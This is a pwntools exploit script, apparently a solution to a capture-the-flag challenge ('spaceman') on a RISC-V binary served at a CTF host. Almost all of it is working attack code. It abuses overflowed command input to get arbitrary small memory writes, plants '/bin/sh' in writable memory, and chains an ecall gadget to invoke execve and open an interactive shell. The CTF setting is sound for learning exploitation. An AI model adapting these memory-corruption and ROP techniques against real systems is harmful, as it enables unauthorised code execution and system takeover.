#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13372

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        set architecture riscv:rv64
        target remote localhost:1234
    '''

    if args.GDB:
        return process(['qemu-riscv64', '-g', '1234', 'spaceman'], level='error')
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def write_three_bytes(io, p_addr, addr, data): 
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["read"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))

    sl(io, data)
    
def write_data(io, pp_addr, p_addr, addr, data):
    # for some reason the function is being weird
    # so instead of fixing it I am just gonna add something to cope with it
    # spoken like a true programmer
    data = b"AAA\x00\x00" + data

    for i in range(int(len(data) / 3)):
        print(data[i * 3: i * 3 + 3])
        write_three_bytes(io, p_addr, addr, data[i * 3: i * 3 + 4])
        addr += 3

        write_three_bytes(io, pp_addr, p_addr, p32(addr))

def open_at(io, p_addr, addr):
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["openat"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))
 

def exploit(io,e):
    sleep(5)
    # 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
    # pp_addr -> p_addr -> writeable_ptr -> writeable mem
    flag_fd = 5
    p_addr = 0x8a2b8
    pp_addr = 0x8a488
    writable_addr = 0x8a510
    gadget = 0x2c3be

    ecall_num = p64(0xdd) # execve 221
    third_arg = p64(0) 
    ecall = p64(0x1d8ac) # ecall; ret gadget 
    first_arg = p64(writable_addr+0x10) # ptr to "/bin/sh"
    second_arg = p64(0)

    chain = b"A" * 8 
    chain += ecall_num + third_arg
    chain += ecall + first_arg
    chain += second_arg

    sla(io, b"LOGIN: ", chain)

    binsh = b"/bin/sh\x00\x00"

    # write /bin/sh
    write_data(io, pp_addr, p_addr, writable_addr+0xb, binsh)
    
    # set ptr back to beginning of writeable data
    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr+0x10))
 
    # write ROP
    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
    write_data(io, pp_addr, p_addr, writable_addr - 5, p64(0x5))
    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
    
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(gadget)
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(writable_addr))    

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
